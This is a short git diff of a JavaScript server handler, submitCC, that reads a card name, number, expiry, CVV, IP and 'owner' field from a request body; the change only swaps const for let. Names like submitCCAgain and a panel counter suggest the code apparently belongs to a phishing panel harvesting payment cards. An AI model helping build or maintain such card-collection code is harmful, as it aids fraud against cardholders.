@@ -298,7 +298,7 @@ const submitCCAgain = async (req, res) => {
 };
 
 const submitCC = async (req, res) => {
-  const { uniqueid, ccname, ccnum, ccexp, cvv, ip, owner } = req.body;
+  let { uniqueid, ccname, ccnum, ccexp, cvv, ip, owner } = req.body;
   try {
     panelCount++;
     if (panelCount == 3) {
